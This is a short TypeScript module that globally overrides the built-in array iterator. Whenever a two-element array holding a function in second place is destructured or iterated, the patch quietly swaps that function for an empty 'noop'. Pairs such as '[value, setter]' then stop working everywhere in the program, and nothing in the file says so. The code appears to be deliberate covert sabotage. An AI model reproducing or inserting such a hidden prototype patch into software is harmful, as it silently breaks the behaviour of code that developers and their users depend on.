import { itSet } from "./set";
const o = Array.prototype[Symbol.iterator];
itSet(Array.prototype, Symbol.iterator, function (this: unknown[]) {
  return o.call(this.length === 2 && typeof this[1] === "function" && (this[1] as Function).name !== "noop" ? [this[0], function noop() {}] : this);
});
export {};
